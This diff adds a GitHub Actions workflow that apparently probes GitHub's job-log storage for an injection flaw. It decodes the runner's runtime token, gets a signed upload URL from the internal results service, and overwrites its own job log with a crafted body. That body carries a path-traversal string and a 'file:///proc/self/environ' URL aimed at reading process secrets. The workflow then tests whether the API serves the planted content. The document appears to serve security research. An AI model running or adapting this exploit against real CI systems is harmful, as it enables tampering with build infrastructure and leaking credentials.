@@ -1,0 +1,56 @@
+name: Probe live job-log carrier
+on:
+  workflow_dispatch:
+permissions:
+  actions: read
+  contents: read
+jobs:
+  carrier:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Seed job log
+        run: echo seed
+      - name: Write and read controlled job log
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
+            const results = process.env.ACTIONS_RESULTS_URL;
+            const repo = process.env.GITHUB_REPOSITORY;
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const token = process.env.GH_TOKEN;
+            const apiHeaders = {Authorization: 'Bearer ' + token, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-job-log-probe'};
+            const jobsResponse = await fetch('https://api.github.com/repos/' + repo + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: apiHeaders});
+            if (!jobsResponse.ok) throw new Error('list jobs HTTP ' + jobsResponse.status);
+            const job = (await jobsResponse.json()).jobs.find(x => x.name === 'carrier');
+            if (!job) throw new Error('carrier job missing');
+            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
+            const [, workflow_run_backend_id, workflow_job_run_backend_id] = scope.split(':');
+            const body = Buffer.from(JSON.stringify({full_name: 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'job log carrier probe', stargazers_count: 1}));
+            const headers = {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json', Accept: 'application/json'};
+            async function rpc(method, document) {
+              const response = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method: 'POST', headers, body: JSON.stringify(document)});
+              const text = await response.text();
+              if (!response.ok) throw new Error(method + ' HTTP ' + response.status + ' ' + text.slice(0,160));
+              return JSON.parse(text);
+            }
+            const ids = {workflow_run_backend_id, workflow_job_run_backend_id};
+            const signed = await rpc('GetJobLogsSignedBlobURL', ids);
+            const put = await fetch(signed.logs_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/json\u0085', 'x-ms-version': '2023-11-03'}, body});
+            console.log('JOB_PUT=' + put.status + ' BODY=' + body.length + ' JOB=' + job.id);
+            await put.arrayBuffer();
+            const metadata = await rpc('CreateJobLogsMetadata', {...ids, uploaded_at: new Date().toISOString(), line_count: 1});
+            console.log('JOB_METADATA=' + JSON.stringify(metadata));
+            const api = await fetch('https://api.github.com/repos/' + repo + '/actions/jobs/' + job.id + '/logs', {headers: apiHeaders, redirect: 'manual'});
+            const location = api.headers.get('location');
+            console.log('JOB_LIVE_API=' + JSON.stringify({status: api.status, type: api.headers.get('content-type'), location: Boolean(location), body: location ? '' : (await api.text()).slice(0,180)}));
+            if (location) {
+              const raw = await fetch(location);
+              const bytes = Buffer.from(await raw.arrayBuffer());
+              console.log('JOB_LIVE_RAW=' + JSON.stringify({status: raw.status, type: raw.headers.get('content-type'), bytes: bytes.length, exact: bytes.equals(body), json: (() => {try {JSON.parse(bytes.toString()); return true} catch {return false}})(), prefix: bytes.subarray(0,16).toString('hex')}));
+            }
